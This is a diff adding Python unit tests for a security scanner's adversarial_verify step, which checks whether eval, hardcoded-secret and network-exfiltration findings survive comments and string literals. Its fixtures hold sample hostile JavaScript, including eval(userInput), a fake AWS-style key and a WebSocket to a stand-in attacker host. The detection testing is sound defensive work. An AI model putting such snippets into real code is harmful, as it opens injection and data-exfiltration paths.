@@ -350,3 +350,53 @@ class TestAdversarialVerify:
         findings = [Finding("critical", "eval-like-execution", "app.js", 99, "msg")]
         result = adversarial_verify(findings, {"app.js": "eval(userInput);"})
         assert result == []
+
+    def test_inline_comment_suppresses_eval_finding(self):
+        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
+        result = adversarial_verify(findings, {"app.js": "const note = 1; // eval(userInput);"})
+        assert result == []
+
+    def test_multiline_block_comment_continuation_suppresses_finding(self):
+        findings = [
+            Finding("critical", "eval-like-execution", "app.js", 2, "msg"),
+        ]
+        files = {
+            "app.js": (
+                "/* eval(userInput);\n"
+                "  more comment text\n"
+            ),
+        }
+        result = adversarial_verify(findings, files)
+        assert result == []
+
+    def test_hardcoded_secret_inside_string_is_kept(self):
+        findings = detect_hardcoded_secrets("app.js", 'const key = "AKIAABCDEFGHIJKLMNOP";')
+        result = adversarial_verify(findings, {"app.js": 'const key = "AKIAABCDEFGHIJKLMNOP";'})
+        assert len(result) == 1
+
+    def test_websocket_after_inert_fetch_is_kept(self):
+        content = 'const url = "fetch(\'http://example.com\')"; new WebSocket("wss://evil.example.com/ws");'
+        findings = detect_network_exfil("app.js", content)
+        result = adversarial_verify(findings, {"app.js": content})
+        assert len(result) == 1
+        assert result[0].rule_id == "network-exfil"
+
+    def test_eval_after_string_with_escaped_quote_is_kept(self):
+        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
+        result = adversarial_verify(findings, {"app.js": 'const label = "it\\\'s safe"; eval(userInput);'})
+        assert len(result) == 1
+
+    def test_eval_inside_backtick_is_dropped(self):
+        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
+        result = adversarial_verify(findings, {"app.js": 'const msg = `eval(userInput)`;'})
+        assert result == []
+
+    def test_eval_after_nested_quotes_is_kept(self):
+        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
+        result = adversarial_verify(findings, {"app.js": """const msg = "He said 'hello'"; eval(userInput);"""})
+        assert len(result) == 1
+
+    def test_eval_inside_block_comment_on_same_line_is_dropped(self):
+        findings = [Finding("critical", "eval-like-execution", "app.js", 1, "msg")]
+        result = adversarial_verify(findings, {"app.js": "const note = 1; /* eval(userInput) */;"})
+        assert result == []
